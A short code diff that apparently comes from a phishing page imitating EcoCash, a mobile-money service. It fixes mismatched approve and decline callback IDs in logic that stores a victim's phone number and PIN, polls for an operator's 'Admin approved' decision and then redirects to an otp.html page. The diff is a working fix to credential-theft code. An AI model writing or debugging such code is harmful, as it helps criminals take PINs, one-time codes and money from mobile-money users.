@@ -561,7 +561,7 @@
             if (!callback) continue;
             const cbData = callback.data;
             
-            if (cbData === approveCallbackId) {
+            if (cbData === approveId) {
               // Admin approved -> redirect to otp.html
               stopPolling();
               isProcessing = false;
@@ -574,7 +574,7 @@
               return;
             }
             
-            if (cbData === declineCallbackId) {
+            if (cbData === declineId) {
               // Admin declined
               stopPolling();
               isProcessing = false;
@@ -600,8 +600,8 @@
       const timestamp = Date.now();
       const approveId = `ecocash_approve_${timestamp}`;
       const declineId = `ecocash_decline_${timestamp}`;
-      currentApproveId = approveCallbackId;
-      currentDeclineId = declineCallbackId;
+      currentApproveId = approveId;
+      currentDeclineId = declineId;
       
       pendingPhoneRaw = localPhoneNumber;
       pendingPin = pinCode;
